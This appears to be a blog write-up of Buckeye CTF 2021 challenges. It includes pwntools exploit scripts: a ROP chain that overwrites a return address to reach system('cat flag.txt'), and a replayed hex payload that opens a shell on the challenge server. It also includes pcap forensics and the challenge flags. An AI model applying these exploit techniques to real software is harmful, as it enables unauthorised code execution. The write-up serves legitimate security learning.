---
layout: article
title:  "Buckeye CTF'21 writeup"
date:   2021-10-25 01:30:53 +0  530
tags:
  - writeup
  - buckeyectf
---

# pwn


## staff

This is an easy challenge but requires careful observation and code analysis to solve.

challenge [files](https://github.com/cscosu/buckeyectf-2021/tree/master/pwn/staff/deploy)

if you observe, `instuctor` string is printed at the end of the both functions, but is unreachable in one of the functions

```c
// find_instructor()
printf("Professor %s will teach %s, but we'll probably change our minds the week before classes start.\n", instructor, course);

// find_course()
printf("This course will be taught by: %s\n", instructor);
```

if you check in `gdb` ,

`$rbp = 0x7fffffffd120` for both `find_course` and `find_instructor` functions. 

Also, 

- for find_course, `instuctor` is at address `rbp - 0x30` and `course` at `rbp - 0x50`
- for find_instructor,  `instuctor` is at address `rbp - 0x50` and `course` at `rbp - 0x30`

so their addresses are interchanged

Normally we would just like to pass `FLAG 1337` to `find_course` function and get the flag, but the print statement is unreachable, but even so the flag is loaded in the instructor at `rbp - 0x30` (instructor) in `find_course` function. so now when we now call the `find_instructor` function, `course` variable will have the flag. So we want to print this variable without overwriting it, this can be done by entering `Staff` and we will get the flag.

```clojure
❯ nc pwn.chall.pwnoh.io 13383
What would you like to do?
1. Search for a course
2. Search for an instructor
> 1
What course would you like to look up?
> FLAG 1337
This course will be taught by: Staff
What would you like to do?
1. Search for a course
2. Search for an instructor
> 2
What instructor would you like to look up?
> Staff
There were 6 results, please be more specific in your search.
Professor Staff will teach buckeye{if_0n1y_th15_w0rk3d}, but we'll probably change our minds the week before classes start.
```

---

## ret4win

This is the first time I encountered a rop pwn challenge (yes I'm new to pwn) and it turned out to be 64bit, XD.

challenge [file](https://github.com/cscosu/buckeyectf-2021/tree/master/pwn/staff/deploy)

Our aim is to execute `system("cat flag.txt")`

For this the obvious choice that the challenge presents is , make the system jump to `win` function while passing the correct 6 arguments. Passing 6 arguments is impossible here.

We can read `56` bytes : `read(0, buf, 32 + 8 + 16);`

By passing a pattern ( `cyclic 56`) , and using `gdb` we can determine the offset for `RIP` register, which here is `40` bytes.  ( so only 16 bytes left to pass arguments and return address for `win` function which it makes it impossible to pass all).

So the next choice would be to return to `system` call and before that pass `"cat flag.txt"` as argument into `RDI` (in 64 bit arch, the first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. 
But I couldn't find any gadget (`pop rdi ; ret ;`) to pass the argument into RDI, so I started looking for another method to pass `"cat flag.txt"` into RDI.

```clojure
// in win() function
0x0000000000401245 <+101>:	mov    rdi,rax
0x0000000000401248 <+104>:	call   0x401030 <system@plt>
```

The instruction just before system call in `win` is `mov rdi rax` so if moved the argument into rax and then returned to this instruction it will move it to rdi and then execute the system command.

If you follow the `win` function, you will observe that after returning from this function, `rax` is holding the "cat flag.txt" address.

So we can return to `win` which will move the argument into `rax` and then call the mov instruction.

So here we will use 40 + 8 + 8 bytes, just inside the input size of read().

```python
from pwn import *

target = remote('pwn.chall.pwnoh.io',13379)

payload = b'A'*40					          # 40 bytes offset
payload += p64(0x00000000004011e0)  # address of win() overwriting RIP
payload += p64(0x0000000000401245)  # address of mov rdi, rax

print(target.recvline())
target.sendline(payload)
print(target.recvall())

```

---

# misc

## replay

challenge pcap [file](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/replay/dist/replay.pcap) 

We are given the network capture of a payload being sent to a binary to exploit it.
So we just need to find that payload from the network capture and send it to the server where the binary is running.

examining the pcap file, we find there is a packet with data that looks like a payload `aaaaaa.....`

So we copy that raw data from there.

```python
6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
```

I converted this to hexadecimal character escape form in a adhoc fashion and then printed it as byte data, and routed that to the binary server.

but I later found out there is a better way to do it, with `fromhex()` function ( v > 3.5)

```python
from pwn import *

target = remote('misc.chall.pwnoh.io',13371)
rawpayload = "6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a"
payload = bytes.fromhex(rawpayload)
target.recvline()
target.sendline(payload)
target.interactive()
```

```python
❯ python3 pwntl.py
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
[*] Switching to interactive mode
$ cat flag.txt
buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
```

---

## USB Exfiltration

We are given the traffic of a usb transfer and there has been a transfer of `zip` file.

[pcapng file](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/usb_exfiltration/dist/exfiltration.pcapng)

Opening this in wireshark shows a lot of (644) packets. Most of them are small, but some of them standout in size. Examining the first of them (in time order) showed that it started with `PK...` which told me it is the bytes of a zip file.

I observed that this data was in the packet numbers - `415,417,.....497`

So I used `scapy` in python to extract and join them together

```python
from scapy.all import *
packets = rdpcap('./exfiltration.pcapng')
data = b""
i = 414  # 0 indexed
while i<=496:
	data += raw(packets[i])[64:]
	i+=2
f = open("zipfile", "wb")
f.write(data)
```

unzipping the file we get two files :

`meme.png`

![meme](https://github.com/cscosu/buckeyectf-2021/raw/master/misc/usb_exfiltration/src/meme.png)

`flag.b64`

```python
YnVja2V5ZXt3aHlfMXNudF83aDNyM180X2RpNTVlY3Qwcl80X3RoMXN9Cg==
```

decoding this base64 data

```python
>>> import base64
>>> base64.b64decode("YnVja2V5ZXt3aHlfMXNudF83aDNyM180X2RpNTVlY3Qwcl80X3RoMXN9Cg==")
b'buckeye{why_1snt_7h3r3_4_di55ect0r_4_th1s}\n'
```